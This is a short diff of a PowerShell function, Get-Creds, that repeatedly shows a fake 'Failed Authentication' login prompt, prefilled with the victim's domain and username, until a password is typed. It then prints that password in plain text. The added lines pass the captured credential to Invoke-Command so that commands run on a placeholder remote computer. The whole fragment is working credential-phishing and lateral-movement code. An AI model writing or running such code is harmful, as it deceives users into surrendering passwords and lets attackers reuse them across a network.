@@ -57,7 +57,17 @@ function Get-Creds {
 
     while ($form -eq $null)
     {
-        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName);
+
+        # Example: Use the credentials to run a command remotely
+        $remoteComputerName = "RemoteComputerName"
+        $scriptBlock = {
+            # Your remote commands here
+            Get-Process
+        }
+
+        # Use the credentials to connect to the remote computer and run the command
+        Invoke-Command -ComputerName $remoteComputerName -Credential $cred -ScriptBlock $scriptBlock
         $cred.getnetworkcredential().password
 
         if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
